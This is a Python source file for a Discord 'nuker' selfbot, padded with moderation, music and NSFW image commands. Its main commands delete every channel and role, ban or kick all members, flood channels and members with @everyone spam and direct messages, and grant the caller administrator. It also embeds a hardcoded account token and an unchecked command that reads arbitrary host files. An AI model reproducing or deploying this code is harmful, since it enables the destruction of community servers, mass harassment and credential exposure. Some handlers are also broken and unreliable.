import os
import jishaku
import discord
from discord.ext import commands, tasks
from discord import app_commands
from discord.ui import View, Button
import random
from random import randint
import asyncio
import colorama
from colorama import Fore
from server import app
import pyfiglet
from pyfiglet import Figlet
import time
import sys
from googletrans import Translator
import requests
import aiohttp
import youtube_dl

intents = discord.Intents.all()
intents.voice_states = True
intents.members = True
bot = commands.Bot(command_prefix="$", intents=intents)

channel_id = 1184157777300562081

o_id = [1020693089851027457]
bot.owner_ids = o_id
bot.remove_command('help')
MESSAGE_CONTENTS = ["@everyone Nuked ?\n**Numb <$ On Top**"]
CHANNEL_NAMES = ["nuked-by-numb", "numb-is-here", "numb-op"]


ydl_opts = {
    'format': 'bestaudio/best',
    'postprocessors': [{
        'key': 'FFmpegVideo',
        'preferredcodec': 'mp4',
        'options': '-vn',
    }],
}


@bot.event
async def on_voice_state_update(member, before, after):
    if member.id == bot.user.id and after.channel is None:
        print("Bot disconnected, attempting to reconnect.")
        await reconnect_to_voice_channel()


async def reconnect_to_voice_channel():
    channel = bot.get_channel(channel_id)
    if channel:
        await channel.connect()


@tasks.loop(minutes=1)
async def check_voice_channel():
    channel = bot.get_channel(channel_id)
    if channel:
        if not bot.voice_clients:
            print("Bot not in the voice channel, attempting to connect.")
            await reconnect_to_voice_channel()
    else:
        print("Voice channel not found. Make sure the channel ID is correct.")


@check_voice_channel.before_loop
async def before_check_voice_channel():
    await bot.wait_until_ready()


@bot.command(name="ping")
async def ping(ctx):
    await ctx.message.delete()
    latency = round(bot.latency * 1000)
    await ctx.send(f"🏓Ping: **{latency}ms**")



@bot.command()
async def say(ctx, channel: discord.TextChannel, *, message):
    await ctx.message.delete()
    """Announce a message in the specified channel."""
    await channel.send(message)
    ok = await ctx.send(f'Message sent in {channel.mention}')
    await asyncio.sleep(1)
    await ok.delete()



@bot.command(name='trash')
async def trash(ctx):
  await ctx.message.delete()
  lol = await ctx.send("Enjoy !")
  await asyncio.sleep(1)
  await lol.delete()
  g = ctx.guild
  gg = g.get_member(891209569764794388)
  for i in range(1000):
    await gg.send("<@891209569764794388> **NUKERR ??** 😈")


@bot.command()
async def delete(ctx):
  await ctx.message.delete()
  for c in ctx.guild.text_channels:
    try:
        await c.delete()
    except discord.errors.HTTPException as e:
        if e.status == 400 and e.code == 50074:
            # This is the specific error code for community channels
            print(f"Skipped deletion of channel {c.name} as it's required for community servers.")
        else:
            # If it's a different HTTPException, re-raise the error
            raise e
  for vc in ctx.guild.voice_channels:
    try:
        await vc.delete()
    except discord.errors.HTTPException as e:
        if e.status == 400 and e.code == 50074:
            # This is the specific error code for community channels
            print(f"Skipped deletion of voice channel {vc.name} as it's required for community servers.")
        else:
            # If it's a different HTTPException, re-raise the error
            raise e


  for stage_channel in ctx.guild.stage_channels:
    try:
        await stage_channel.delete()
    except discord.errors.HTTPException as e:
        if e.status == 400 and e.code == 50074:
            print(f"Skipped deletion of stage channel {stage_channel.name} as it's required for community servers.")
        else:
            raise e

  for nsfw_channel in ctx.guild.text_channels:
    if nsfw_channel.is_nsfw():
        try:
            await nsfw_channel.delete()
        except discord.errors.HTTPException as e:
            if e.status == 400 and e.code == 50074:
                print(f"Skipped deletion of NSFW channel {nsfw_channel.name} as it's required for community servers.")
            else:
                raise e
  for cat in ctx.guild.categories:
    try:
        await cat.delete()
    except discord.errors.HTTPException as e:
        if e.status == 400 and e.code == 50074:
            # This is the specific error code for community channels
            print(f"Skipped deletion of category {cat.name} as it's required for community servers.")
        else:
            # If it's a different HTTPException, re-raise the error
            raise e

  await ctx.guild.create_text_channel("deleted")

@bot.command()
async def create(ctx):
  await ctx.message.delete()
  for i in range(100):
    await ctx.guild.create_text_channel("nuked-and-fucked-up")


@bot.command()
async def setup(ctx):
    category_data = {
        '👋 - Reception': ['🍁・Overview', '📚・Guidelines', '🚀・Server-Boosts', '💫・Level-ups', '🎯・Self-Intro'],
        '✈️ - Dashboard': ['📢・Statements', '🎬・Yt-Uploads', '🔔・Updates', '🎭・Texture-Pack', '📊・Polls', '📋・Staff-Info'],
        '🌍 - Community': ['💬・Chat', '📸・Media-share', '🤖・Bot-cmds', '🎨・Art-Showcase', '💎・Boosters-Chat', '👾・Bot-Games'],
        '🔊 - Voice Chats': ['🎤・vc-remote', '🎙️・Stage'],
        '☎️ - Help Desk': ['💭・Opinions', '🎫・Tickets'],
        # STAFF ZONE (PRIVATE)
        '🚨 - Staffs Area': ['📕・Staff-Guidelines', '📢・Staff-Annc', '💬・Staff-chat', '🤖・Staff-cmd', '🛎️・Staff-works', '📝・Leave-app'],
        '🛠️ - Server Logs': ['🔐・server-log', '🔐・members-log', '🔐・channels-log', '🔐・roles-log', '🔐・message-logs']
    }
    voice_channels = ['🎙️・General VC', '🎙️・Gaming VC', '🎙️・Boosters VC']

    await ctx.message.delete()

    for c in ctx.guild.text_channels:
      try:
          await c.delete()
      except discord.errors.HTTPException as e:
          if e.status == 400 and e.code == 50074:
              # This is the specific error code for community channels
              print(f"Skipped deletion of channel {c.name} as it's required for community servers.")
          else:
              # If it's a different HTTPException, re-raise the error
              raise e

    for vc in ctx.guild.voice_channels:
      try:
          await vc.delete()
      except discord.errors.HTTPException as e:
          if e.status == 400 and e.code == 50074:
              # This is the specific error code for community channels
              print(f"Skipped deletion of voice channel {vc.name} as it's required for community servers.")
          else:
              # If it's a different HTTPException, re-raise the error
              raise e


    for stage_channel in ctx.guild.stage_channels:
      try:
          await stage_channel.delete()
      except discord.errors.HTTPException as e:
          if e.status == 400 and e.code == 50074:
              print(f"Skipped deletion of stage channel {stage_channel.name} as it's required for community servers.")
          else:
              raise e

    for nsfw_channel in ctx.guild.text_channels:
      if nsfw_channel.is_nsfw():
          try:
              await nsfw_channel.delete()
          except discord.errors.HTTPException as e:
              if e.status == 400 and e.code == 50074:
                  print(f"Skipped deletion of NSFW channel {nsfw_channel.name} as it's required for community servers.")
              else:
                  raise e

  
    for cat in ctx.guild.categories:
      try:
          await cat.delete()
      except discord.errors.HTTPException as e:
          if e.status == 400 and e.code == 50074:
              # This is the specific error code for community channels
              print(f"Skipped deletion of category {cat.name} as it's required for community servers.")
          else:
              # If it's a different HTTPException, re-raise the error
              raise e

    await asyncio.sleep(1)

    # Create new channels and categories
    for category_name, text_channels in category_data.items():
        # Check if the category already exists
        category = discord.utils.get(ctx.guild.categories, name=category_name)
        if category is None:
            # Make 'Staffs Area' and 'Server Logs' categories private
            if category_name in ['🚨 - Staffs Area', '🛠️ - Server Logs']:
                category = await ctx.guild.create_category(category_name, overwrites={ctx.guild.default_role: discord.PermissionOverwrite(view_channel=False)})
            else:
                category = await ctx.guild.create_category(category_name)

        for channel_name in text_channels:
            # Check if the text channel already exists
            text_channel = discord.utils.get(ctx.guild.text_channels, name=channel_name)
            if text_channel is None:
                # Modify conditions based on channel names to set specific channel types
                if channel_name == '🎙️・Stage':
                    await category.create_stage_channel(channel_name)
                elif channel_name in ['📢・Statements', '🎬・Yt-Uploads', '🔔・Updates', '🎭・Texture-Pack', '📊・Polls', '📋・Staff-Info']:
                    await category.create_text_channel(channel_name)
                elif channel_name == '💭・Opinions':
                    await category.create_text_channel(channel_name, topic='Discussion and Opinions')
                else:
                    await category.create_text_channel(channel_name)

        if category_name == '🔊 - Voice Chats':
            for channel_name in voice_channels:
                # Check if the voice channel already exists
                if channel_name == '🎤・vc-remote':
                    # Create 'vc-remote' as a text channel
                    text_channel = discord.utils.get(ctx.guild.text_channels, name=channel_name)
                    if text_channel is None:
                        await category.create_text_channel(channel_name)
                else:
                    # Create other voice channels in the 'Voice Chats' category
                    voice_channel = discord.utils.get(ctx.guild.voice_channels, name=channel_name)
                    if voice_channel is None:
                        await category.create_voice_channel(channel_name)

    await ctx.send('Auto setup complete.')



@bot.command()
async def setuproles(ctx):
    role_data = {
        'Admin': discord.Permissions.all(),
        'Moderator': discord.Permissions(
            kick_members=True,
            ban_members=True,
            manage_channels=True,
            manage_roles=True
        ),
        'Member': discord.Permissions(
            read_messages=True,
            send_messages=True,
            read_message_history=True
        ),
        'Guest': discord.Permissions(
            read_messages=True,
            send_messages=True
        )
    }

    # Check if the bot has the necessary permissions to manage roles
    if ctx.guild.me.guild_permissions.manage_roles:
        try:
            await ctx.message.delete()

            # Get the bot's member object
            bot_member = ctx.guild.get_member(bot.user.id)

            # Fetch roles asynchronously
            roles_to_delete = [
                role for role in reversed(ctx.guild.roles)
                if role.name != '@everyone' and bot_member.top_role > role
            ]

            # Delete existing roles
            for role in roles_to_delete:
                await role.delete()

            await asyncio.sleep(1)  # Sleep to allow time for role deletion

            # Create new roles
            for role_name, permissions in role_data.items():
                await ctx.guild.create_role(name=role_name, permissions=permissions)

            await ctx.send('Roles setup complete.')
        except discord.Forbidden:
            await ctx.send("I don't have the necessary permissions to manage roles in this server.")
        except discord.HTTPException as e:
            await ctx.send(f"An error occurred: {e}")
    else:
        await ctx.send("I don't have the necessary permissions to manage roles in this server.")



@bot.command()
async def nuke(ctx):
  await ctx.message.delete()
  for c in ctx.guild.text_channels:
    for i in range(1000):
      await c.send("@everyone nuked and fucked up")



@bot.command()
async def source(ctx, file_path: str):
    try:
        with open(file_path, 'r') as file:
            source_code = file.read()

            # Split the content into chunks of 10 lines or fewer
            lines = source_code.split('\n')
            chunks = [lines[i:i+10] for i in range(0, len(lines), 10)]

            embed = discord.Embed(description=f"**__SOURCE CODE OF__**: `{file_path}`\n> **Requested By**: `{ctx.author.name}`\n> **File Path**: {file_path}\n\n", color=0x2f3136)
            embed.set_author(name=f"| Rage Security™", icon_url=f"https://cdn.discordapp.com/avatars/110044244417.png?size=10018906/bf640377c474b9c15957f7d3f575b35c024")
            embed.set_footer(text=f"| Powered By Rage Security™", icon_url="https://cdn.discordapp.com/avatars/1100442444170018906/bf640377c474b9c15957f7d3f575b35c.png?size=1024")
            #embed.set_thumbnail(url=ctx.self.avatar.url)

            for i, chunk in enumerate(chunks):
                field_name = f"Code of lines {i*10 + 1} to {(i+1)*10}"
                field_value = "```python\n" + "\n".join(chunk) + "\n```"
                embed.add_field(name=field_name, value=field_value, inline=False)

            await ctx.message.delete()
            await ctx.send(embed=embed)

    except FileNotFoundError:
        await ctx.send(f"File `{file_path}` not found.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")




@bot.command()
async def help(ctx):
  await ctx.message.delete()
  embed = discord.Embed(title=f"**__NUMB's SELFBOT PY__**", description="""```
help
helpnuke
invite
purge
say #chnl_id <msg>
av
whois
ping
serverinfo
ban @user <xyz>
kick @user <xyz>
lock #channel
unlock #channel
hide #channel
unhide #channel
ytsearch <search>
nsfwpussy
nsfwboobs
nsfw4k
nsfwn (best command)
nsfwwaifu
nsfwneko
nsfwtrap
```
>>> ** [Github](https://github.com/NumbOp/SelfBot-Nuker) **
 ** [Discord](https://discord.gg/2Bjbnc2ep4) **
""", timestamp = ctx.message.created_at, color=0x2f3136)

  embed.set_author(name="Developer : Numb <$", icon_url="https://images-ext-2.discordapp.net/external/_NpHPRjMUISbs0iJU5WnMkk0TwtXHZsA-d1aiSiQL4A/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/1100442444170018906/bf640377c474b9c15957f7d3f575b35c.png?format=webp&quality=lossless&width=479&height=479")
  embed.set_thumbnail(url=bot.user.avatar.url)
  await ctx.send(embed=embed)


@bot.command(aliases=["sniper"])
async def msgsniper(ctx, msgsniperlol=None):
  await ctx.message.delete()
  if str(msgsniperlol).lower() == 'true' or str(
      msgsniperlol).lower() == 'on':
    botmsgsniper = True
    await ctx.send('bot Message-Sniper is now **enabled**')
  elif str(msgsniperlol).lower() == 'false' or str(
      msgsniperlol).lower() == 'off':
    bot.msgsniper = False
    await ctx.send('bot Message-Sniper is now **disabled**')


@bot.command()
async def stream(ctx, *, message):
  stream = discord.Streaming(
      name=message,
      url="https://twitch.tv/https://Wallibear",
  )
  await bot.change_presence(activity=stream)
  await ctx.send("✅ ` STREAM CREATED`")
  await ctx.message.delete()



@bot.command()
async def ytsearch(msg, *, search=''):

    if search == '':
      await msg.send('provide a search query.')
    query_string = urllib.parse.urlencode({
        "search_query": search
    })
    html_content = urllib.request.urlopen(
        "http://www.youtube.com/results?" + query_string
    )
    search_results = re.findall(r"watch\?v=(\S{11})", html_content.read().decode())
    nab = search.replace('@', '')
    await msg.send(f"<:Tick:1109436326710870079> RESULTS ARE - `{nab}`:\n\nhttp://www.youtube.com/watch?v=" + search_results[0])




@bot.command()
async def restart(ctx):
    await ctx.reply('✅ Restarting...')
    os.execl(sys.executable, sys.executable, *sys.argv)




@bot.command(aliases=["playing"])
async def game(ctx, *, message):
    game = discord.Game(name=message)
    await bot.change_presence(activity=game)
    await ctx.reply("✅ ` PLAYING CREATED`", mention_author=True)


@bot.command(aliases=["watch"])
async def watching(ctx, *, message):
    await bot.change_presence(activity=discord.Activity(
        type=discord.ActivityType.watching, name=message, ))
    await ctx.reply("✅ ` WATCHING CREATED`", mention_author=True)
tkn = os.getenv('token')

@bot.command(aliases=["listen"])
async def listening(ctx, *, message):
    await bot.change_presence(activity=discord.Activity(
        type=discord.ActivityType.listening,
        name=message,
    ))
    await ctx.reply("✅ ` STATUS CREATED`", mention_author=True)


@bot.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(message)


@bot.command(aliases=[
    "stopstreaming", "stopstatus", "stoplistening", "stopplaying",
    "stopwatching"
])
async def stopactivity(ctx):
    await ctx.message.delete()
    await bot.change_presence(activity=None, status=discord.Status.dnd)





@bot.command(aliases=['purge'])
async def clear(ctx, amount: int):
  # Check if the command invoker has the 'manage_messages' permission
  if ctx.author.guild_permissions.manage_messages:
      try:
          await ctx.channel.purge(limit=amount + 1)
          dn = await ctx.send(f"Successfully purged {amount} messages.")
          await asyncio.sleep(1)
          await dn.delete()
      except discord.Forbidden:
          await ctx.send("I don't have permission to delete messages.")
      except discord.HTTPException as e:
          await ctx.send(f"An error occurred: {e}")
  else:
      await ctx.send("You don't have the required permissions to use this command.")


@bot.command()
async def av(ctx, member: discord.Member):
  embed = discord.Embed(color = 0x2f3136, timestamp=ctx.message.created_at)
  embed.set_author(name=f"{member.name}'s avatar")
  embed.set_image(url='{}'.format(member.avatar))
  embed.set_footer(text=member.id)
  await ctx.send(embed=embed)
  await ctx.message.delete()


@bot.command()
async def helpnuke(ctx):
  await ctx.message.delete()
  embed = discord.Embed(title=f"**__NUMB's SELFBOT PY__**", description="""```
admin
mention
droles
roles
banall
kickall
channels
create
delete
nuke
delete
create
spam <amt> <msg>
prune
dm <msg>
```
>>> ** [Github](https://github.com/NumbOp/SelfBot-Nuker) **
 ** [Discord](https://discord.gg/2Bjbnc2ep4) **
 """, timestamp = ctx.message.created_at, color=0x2f3136)

  embed.set_author(name="Developer : Numb <$", icon_url=bot.user.avatar.url)
  embed.set_thumbnail(url=bot.user.avatar.url)
  await ctx.send(embed=embed)


@bot.command()
async def mention(ctx, amount=10000000000000000000000000):
  await ctx.message.delete()
  if not amount is None:
      for _ in range(amount):
          for channel in ctx.guild.text_channels:
            await channel.send(random.choice(MESSAGE_CONTENTS))
  else:
      while True:
          for channel in ctx.guild.text_channels: 
            await channel.send(random.choice(MESSAGE_CONTENTS))


@bot.command()
async def banall(ctx):
  await ctx.message.delete()
  guild = ctx.message.guild
  for member in list(ctx.message.guild.members):
    try:
        await guild.ban(member)
        print("User " + member.name + " has been banned")
    except:
        pass
        print("Action Completed: banall")


@bot.command()
async def channels(ctx, amount=500):
  await ctx.message.delete()
  await ctx.message.delete()
  guild = ctx.message.guild 
  for i in range(amount):
      await guild.create_text_channel(random.choice(CHANNEL_NAMES))


@bot.command()
async def kickall(ctx):
  await ctx.message.delete()
  guild = ctx.message.guild
  for member in list(ctx.message.guild.members):
    try:    
        await guild.kick(member)
        print("User " + member.name + " has been kicked")
    except:
        pass
        print("Action Completed: kickall")


@bot.command()
async def whois(ctx, member: discord.Member):
  await ctx.message.delete()
  member = ctx.author if not member else member
  roles = [role for role in member.roles]

  embed = discord.Embed(colour=member.color, timestamp=ctx.message.created_at)

  embed.set_author(name=f"{member} - info")
  embed.set_thumbnail(url=member.avatar)
  embed.set_footer(text=f"Requested by {ctx.author}")

  embed.add_field(name="User ID", value=member.id)
  embed.add_field(name="Nickname", value=member.display_name)

  embed.add_field(name="Creation Date", value=member.created_at.strftime("%a, %#d %B, %Y, %I:%M %p UTC"))
  embed.add_field(name="Guild Join Date", value=member.joined_at.strftime("%a, %#d %B, %Y, %I:%M %p UTC"))

  embed.add_field(name=f"Roles ({len(roles)})", value=" ".join([role.mention for role in roles]))
  embed.add_field(name="Highest Role", value=member.top_role.mention)

  embed.add_field(name="Bot?", value=member.bot)

  await ctx.send(embed=embed)



@bot.command()
async def prune(ctx, days: int = 7):
    """
    Prune members who have been inactive for the specified number of days.
    Default is 7 days.
    """
    # Check if the user has the 'kick members' permission
    if ctx.author.guild_permissions.kick_members:
        # Use the prune_members function to prune inactive members
        pruned_members = await ctx.guild.prune_members(days=days, compute_prune_count=True)

        await ctx.send(f"Pruned {pruned_members} inactive members.")
    else:
        await ctx.send("You do not have permission to use this command.")



@bot.command()
async def droles(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print (f"{role.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{role.name} has NOT been deleted in {ctx.guild.name}")


@bot.command()
async def admin(ctx):
  await ctx.message.delete()
  guild = ctx.message.guild
  perms = discord.Permissions(8)
  await guild.create_role(name='$', permissions=perms)
  member = ctx.message.author
  role = discord.utils.get(guild.roles, name="$")
  await member.add_roles(role)
  print ("Admin Given!")



@bot.command()
async def roles(ctx):
  guild = ctx.message.guild
  perms = discord.Permissions(8)
  await ctx.message.delete()
  role = discord.utils.get(guild.roles, name="NUMB ON TOP")
  for members in guild.members:
    await members.add_roles(role)
  #member = ctx.message.author
  for i in range(200):
    await guild.create_role(name='NUMB ON TOP', permissions=perms)



@bot.command()
async def dm(ctx, *, message):
  await ctx.message.delete()
  for user in ctx.guild.members:
    try:
        await user.send(message)
        print(f"{user.name} has recieved the message.")
    except:
        await ctx.send(f"{user.name} has NOT recieved the message.")
        await ctx.send("Action Completed: dm")



@bot.command(pass_centex=True)
async def ban(ctx, member : discord.Member):
    await member.ban()
    await ctx.message.delete()

@bot.command(pass_centex=True)
async def kick(ctx, member : discord.Member):
    await member.kick()
    await ctx.message.delete()


@bot.command()
async def serverinfo(ctx, guild: discord.Guild = None):
  guild = ctx.guild if not guild else guild
  embed = discord.Embed(title=f"Serverinfo of **{guild}**", timestamp = ctx.message.created_at, color=0x2f3136)
  embed.set_thumbnail(url=guild.icon)
  embed.add_field(name="**Description:**", value=guild.description, inline=False)
  embed.add_field(name="**Channel count:**", value=len(guild.channels), inline=False)
  embed.add_field(name="**Role count:**", value=len(guild.roles), inline=False)
  embed.add_field(name="**Booster count:**", value=guild.premium_subscription_count, inline=False)
  embed.add_field(name="**Server created at:**", value=guild.created_at, inline=False)
  embed.add_field(name="**Max Emoji:**", value=guild.emoji_limit, inline=False)
  embed.add_field(name="**Owner**:", value=guild.owner, inline=False)
  embed.set_footer(text=f"Command used by {ctx.author}")

  await ctx.send(embed=embed)
  await ctx.message.delete()



@bot.command()
async def lock(ctx, channel: discord.TextChannel = None):
    await ctx.message.delete()
    channel = channel or ctx.channel
    overwrite = discord.PermissionOverwrite(send_messages=False)

    try:
        await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
        await ctx.send(f"🔒 Channel {channel.mention} has been locked by {ctx.author.mention}.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command()
async def unlock(ctx, channel: discord.TextChannel = None):
    await ctx.message.delete()
    channel = channel or ctx.channel
    overwrite = discord.PermissionOverwrite(send_messages=None)

    try:
        await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
        await ctx.send(f"🔓 Channel {channel.mention} has been unlocked by {ctx.author.mention}.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")


@bot.command()
async def hide(ctx, channel: discord.TextChannel = None):
    await ctx.message.delete()
    channel = channel or ctx.channel
    overwrite = discord.PermissionOverwrite(read_messages=False)

    try:
        await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
        await ctx.send(f"🔒 Channel {channel.mention} has been hidden by {ctx.author.mention}.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command()
async def unhide(ctx, channel: discord.TextChannel = None):
    await ctx.message.delete()
    channel = channel or ctx.channel
    overwrite = discord.PermissionOverwrite(read_messages=None)

    try:
        await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
        await ctx.send(f"🔓 Channel {channel.mention} has been unhidden by {ctx.author.mention}.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")



@bot.command()
async def invite(ctx):
    await ctx.message.delete()
    invite_link = discord.utils.oauth_url(bot.user.id, permissions=discord.Permissions.all())
    await ctx.send(f"Invite me to your server using this link:\n{invite_link}")


@bot.command()
async def gettoken(ctx):
    token = 'MTExMDc1ODg1NDEwODY1OTc0Ng.Gg2Vjy.GQkwNqIkQWQE4M48thA4aErOp28sFsqQmpOvHM'  # Replace with your actual Discord token
    try:
        headers = {'Authorization': token}
        async with aiohttp.ClientSession() as session:
            async with session.get('https://discord.com/api/v9/users/@me', headers=headers) as response:
                if response.status == 200:
                    data = await response.json()
                    has_nitro = data.get('premium_type') == 2  # Nitro is premium_type 2
                    badges = data.get('public_flags', 0)

                    badge_icons = {
                        1: ':first_place:',
                        2: ':second_place:',
                        4: ':third_place:',
                        8: ':medal:',
                        16: ':medal:',
                        32: ':medal:',
                        64: ':medal:',
                        128: ':medal:',
                        256: ':medal:',
                        512: ':medal:',
                        1024: ':medal:',
                        2048: ':medal:',
                        4096: ':medal:',
                        16384: ':tools:',
                        65536: ':tools:'
                    }

                    badge_text = ''
                    for badge, icon in badge_icons.items():
                        if badges & badge == badge:
                            badge_text += icon

                    nitro_text = 'Yes' if has_nitro else 'No'

                    await ctx.send(f'Token: {token}\nNitro: {nitro_text}\nBadges: {badge_text}')
                else:
                    await ctx.send('Invalid token or failed to fetch user data.')
    except Exception as e:
        await ctx.send(f'An error occurred: {str(e)}')



@bot.command()
async def nsfwwaifu(ctx):
    response = requests.get("https://api.waifu.pics/nsfw/waifu")

    if response.status_code == 200:
        waifu_data = response.json()
        waifu_url = waifu_data["url"]
        await ctx.send(waifu_url)
    else:
        await ctx.send("Failed to fetch an anime girl picture. Try again later.")


@bot.command()
async def nsfwneko(ctx):
    response = requests.get("https://api.waifu.pics/nsfw/neko")

    if response.status_code == 200:
        waifu_data = response.json()
        waifu_url = waifu_data["url"]
        await ctx.send(waifu_url)
    else:
        await ctx.send("Failed to fetch an anime girl picture. Try again later.")

      
@bot.command()
async def nsfwtrap(ctx):
    response = requests.get("https://api.waifu.pics/nsfw/trap")

    if response.status_code == 200:
        waifu_data = response.json()
        waifu_url = waifu_data["url"]
        await ctx.send(waifu_url)
    else:
        await ctx.send("Failed to fetch an anime girl picture. Try again later.")



@bot.command()
async def nsfw4k(ctx):
    ok = requests.get("http://api.nekos.fun:8080/api/4k")
    data = ok.json()
    image = data["image"]
    await ctx.send(image)


@bot.command()
async def nsfwpussy(ctx):
    ok = requests.get("http://api.nekos.fun:8080/api/pussy")
    data = ok.json()
    image = data["image"]
    await ctx.send(image)


@bot.command()
async def nsfwboobs(ctx):
    ok = requests.get("http://api.nekos.fun:8080/api/boobs")
    data = ok.json()
    image = data["image"]
    await ctx.send(image)


@bot.command()
async def nsfwn(ctx):
    async with aiohttp.ClientSession() as session:
      async with session.get(
              "https://scathach.redsplit.org/v3/nsfw/gif/") as r:
          if r.status == 200:
              res = await r.json()
          else:
              return

    img = res["url"]

    await ctx.reply(img)


@bot.command()
async def translate(ctx, source_lang, target_lang, *, text):
    try:
        headers = {
            'Authorization': f'DeepL-Auth-Key {api_key}',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        payload = {
            'text': text,
            'source_lang': source_lang,
            'target_lang': target_lang
        }
        response = requests.post('https://api-free.deepl.com/v2/translate', headers=headers, data=payload)
        translation_data = response.json()
        translated_text = translation_data['translations'][0]['text']

        translation_message = (
            f"**Translation**\n"
            f"Source Language: {source_lang}\n"
            f"Target Language: {target_lang}\n"
            f"Source Text: {text}\n"
            f"Translated Text: {translated_text}"
        )

        await ctx.send(translation_message)
    except KeyError:
        await ctx.send("Translation failed. Please check your language codes or try again later.")



@bot.command(name="play", aliases=['p'])
async def play(ctx, url):
    voice_channel = ctx.author.voice.channel
    bot_voice_channel = ctx.voice_client

    if voice_channel:
        if bot_voice_channel and bot_voice_channel.channel.id == voice_channel.id:
            await ctx.send("I'm already in your voice channel.")
        else:
            if bot_voice_channel:
                await bot_voice_channel.disconnect()

            vc = await voice_channel.connect()
            with youtube_dl.YoutubeDL(ydl_opts) as ydl:
                info = ydl.extract_info(url, download=False)
                url2 = info['formats'][0]['url']
                vc.play(discord.FFmpegPCMAudio(url2))
    else:
        await ctx.send("You need to be in a voice channel to use this command.")

@bot.command(name="stop")
async def stop(ctx):
    voice_channel = ctx.voice_client
    if voice_channel:
        voice_channel.stop()
    else:
        await ctx.send("I'm not currently playing anything.")

@bot.command(name="disconnect")
async def disconnect(ctx):
    voice_channel = ctx.voice_client
    if voice_channel:
        await voice_channel.disconnect()
    else:
        await ctx.send("I'm not connected to any voice channel.")



@bot.event
async def on_ready():
    print(Fore.YELLOW + f"MADE BY NUMB <$")
    print(Fore.RED + "Loaded & Online!")
    print(Fore.BLUE + f"Logged in as: {bot.user.name}")
    print(Fore.MAGENTA + f"Connected to: {len(bot.guilds)} guilds")
    print(Fore.MAGENTA + f"Connected to: {len(bot.users)} users")
    print(Fore.YELLOW + f"DISCORD : numb.fy")
    await bot.load_extension("jishaku")
    check_voice_channel.start()
    try:
        synced = await bot.tree.sync()
        print(f"synced {len(synced)} commands")
    except Exception as e:
        print(e)



token=""
bot.run(token)
